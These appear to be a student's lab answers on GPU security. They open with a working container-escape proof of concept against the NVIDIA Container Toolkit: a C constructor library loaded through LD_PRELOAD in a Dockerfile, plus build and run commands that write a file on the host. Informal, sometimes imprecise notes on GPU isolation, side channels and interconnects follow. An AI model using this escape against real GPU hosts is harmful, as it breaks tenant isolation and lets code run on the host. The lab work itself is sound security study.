# Exercise 1

poc.c file:

```c
#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) init() {
        FILE *fptr;

        // Open a file in writing mode
        fptr = fopen("/tmp/output-jord-sam.txt", "w");
        if (fptr == NULL)
                printf("The file is not opened.");
        else{
                fprintf(fptr, "user: jord-sam\n");
        }
        fclose(fptr);
}
```
Dockerfile:
```dockerfile
FROM busybox
ENV LD_PRELOAD=/proc/self/cwd/poc.so
ADD poc.so /
```
Commands:
```bash
$make poc.so
$docker build . -t nct-exploit-jord-sam
$docker run --rm --runtime=nvidia --gpus=all nct-exploit-jord-sam
$cat /tmp/output-jord-sam.txt
```

# Exercise 2.1

**Container GPU Issues: What security vulnerabilities might arise when GPUs 
are shared between containers or when containers have direct GPU access?**

- Context-switching timing penalties exfiltrates shared GPU operations from delays in 
obtaining requested resources
- MPS is off by default in cloud computing to allow for different priorities for 
processes, but that just slows down sampling (by orders of magnitude) but the side-channel
attack is still possible

**VM GPU Passthrough: What attack vectors are introduced when GPUs are passed 
through directly to virtual machines?**

- Directly = can read everything -> Seems bad (can just get information directly)
- Bad configs will let one VM read the other VM

**Isolation Concerns: How might GPU memory persistence, side-channel attacks, 
or privilege escalation differ between containerized and VM environments?**

![vm vs containerization](image.png)

- Shared GPUs are cheaper (allow multiple people to use them) but tradeoff with the
security risk
- There are services that only let you rent whole GPU (lambda labs allows for GPU 
sharing, vast ai doesn't) 
- VM means attacks need to go through the hypervisor so less prone to side-channel 
timing attacks but are vulnerable to lower-level hardware attacks



# Exercise 2.2 

Your Task: After reviewing the materials above, analyze advanced GPU security considerations by addressing:

    Software vs. Hardware Isolation: How does Kubernetes namespace-based multi-tenancy compare to NVIDIA MIG's hardware partitioning for GPU security?

    - Same thing as earlier VMs vs containers. Kubernetes is easier to escalate privileges e.g. if misconfigured. 
    - Hardware partitioning (NVIDIA) is sharing on the same physical GPU -> vulnerable to attacks like exercise 1.


    Attack Surface Analysis: What new vulnerabilities emerge when multiple tenants share GPU resources, and how do different isolation approaches mitigate these risks?

    - The moment you 'break out' of your partition youd get access to everything else. 
    - Isolation with hardware makes this harder, but there's still going to be information you can learn from the behaviour of the GPU. 
    - DOS by overloading one particular process, denying other services on the same GPU trying to use that same process.

    Resource Guarantees: How do the quality-of-service guarantees provided by MIG differ from traditional container resource limits for GPU workloads?

    - MIG ensures one client cannot impact the work or scheduling of other clients and provides enhanced isolation for customers. With MIG, each MIG partition's processors have separate and isolated paths through the entire memory system - the on-chip crossbar ports, L2 cache banks, memory controllers, and DRAM address buses are all assigned uniquely to an individual Instance.
    - But 1/7th of a GPU is really limited, like if you're a datacentre you probably don't want it ?



Deliverable: Compare the security trade-offs between software-only multi-tenancy and hardware-assisted GPU partitioning, identifying which approach would be more suitable for a high-security AI training environment and why.




# Exercise 3.1 GPU Interconnect Architecture



    PCIe Lanes: How do PCIe lanes affect GPU performance? What happens when a GPU has fewer lanes than expected?

    More lanes -> more data flowing to and fro. Bottlenecked, slower than expected 

    NVLink Benefits: Why use NVLink instead of PCIe for GPU-to-GPU communication? What performance advantages does it provide?

    Fast.

    System Architecture: In a multi-GPU training setup, when would data flow through PCIe vs. NVLink?

    NVlink if just gpus talking to each other. pcie for anything else.

Deliverable: Draw a diagram describing how data flows between CPU, system memory, and 4 GPUs connected via both PCIe and NVLink, labeling the bandwidth differences.

[diagram]

Stretch: How does this extend to multi-node clusters? How does infiniband fit in?

infiniband connects the switches that control the nvlinks. lots of data etc. essentially still gpus talking to each other but across nodes.







